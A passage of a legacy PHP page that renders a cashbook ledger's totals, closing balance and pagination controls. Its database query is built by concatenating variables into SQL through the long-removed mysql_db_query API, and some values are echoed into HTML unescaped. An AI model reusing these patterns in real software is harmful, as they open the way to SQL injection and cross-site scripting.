							<td bgcolor="#FE9D81" align="Right"><b><?php echo number_format($crTotal,2,".",""); ?></b></td>
							<td bgcolor="#FE9D81" align="Right"><b><?php echo number_format($drTotal,2,".",""); ?></b></td>
							<td>&nbsp;</td>
							<td>&nbsp;</td>
						</tr>
						<tr bgcolor="#FFDDEE"><?php 
						if(isset($_REQUEST['pg']) && $_REQUEST['pg']>=1){
							echo '<td colspan="4" align="Right"><b>Balance C/F</b>&nbsp;:&nbsp;</td>';
						} else {
							echo '<td colspan="4" align="Right"><b>Closing Balance</b>&nbsp;:&nbsp;</td>';
						}
							if($clBal<0){
								echo '<td align="Right"><b>'.number_format(-1*$clBal,2,".","").'</b></td>
								<td>&nbsp;</td>
								<td>&nbsp;</td>
								<td>&nbsp;</td>';
							} else {
								echo '<td>&nbsp;</td>
								<td align="Right" style="color:red;"><b>'.number_format($clBal,2,".","").'</b></td>
								<td>&nbsp;</td>
								<td>&nbsp;</td>';
							}?>
						</tr>
						</table>
					</td>
				</tr>
				</table>
			</td>
		</tr>
		<tr>
			<td align="center"><?php 
			$sql_total = mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.* FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE vouch_date BETWEEN '".date("Y-m-d",$dt1)."' AND '".date("Y-m-d",$dt2)."' AND company_id=".$cid) or die(mysql_error());
			$tot_row=mysql_num_rows($sql_total);
			$total_page=0;
			echo 'Total <span style="color:red">'.$tot_row.'</span> records&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			echo '<input type="button" name="show" id="show" value="Show:" onclick="paging_list()" />&nbsp;&nbsp;<input name="displayTotalRows" id="displayTotalRows" value="'.$end.'" maxlength="2" size="2" /> rows&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			if($tot_row>$end){
				echo "Page number: ";
				$total_page=ceil($tot_row/$end);
				echo '<select name="page" id="page" onchange="paging_list()" style="vertical-align:middle">';
				for($i=1;$i<=$total_page;$i++){
					if(isset($_REQUEST["pg"]) && $_REQUEST["pg"]==$i)
						echo '<option selected value="'.$i.'">'.$i.'</option>';
					else
						echo '<option value="'.$i.'">'.$i.'</option>';
				}
				echo '</select>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			} else {
				echo '<input type="hidden" name="page" id="page" value="1" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			}
			
			echo '<input type="hidden" name="totalPage" id="totalPage" value="'.$total_page.'" />';
			if($total_page>1 && $_REQUEST["pg"]>1)
				echo '<input type="button" name="fistPage" id="firstPage" value=" << " onclick="firstpage_list()" />&nbsp;&nbsp;<input type="button" name="prevPage" id="prevPage" value=" < " onclick="previouspage_list()" />&nbsp;&nbsp;';
			if($total_page>1 && $_REQUEST["pg"]<$total_page)
				echo '<input type="button" name="nextPage" id="nextPage" value=" > " onclick="nextpage_list()" />&nbsp;&nbsp;<input type="button" name="lastPage" id="lastPage" value=" >> " onclick="lastpage_list()" />';
			echo '&nbsp;&nbsp;<input type="button" value="Exit" style="width:80px;" onclick="window.location=\'CashbookMenu.php\'">';
			?>
			</td>
		</tr>
		</table>
	</td>
</tr>
</table>
</form>
</body>
</html>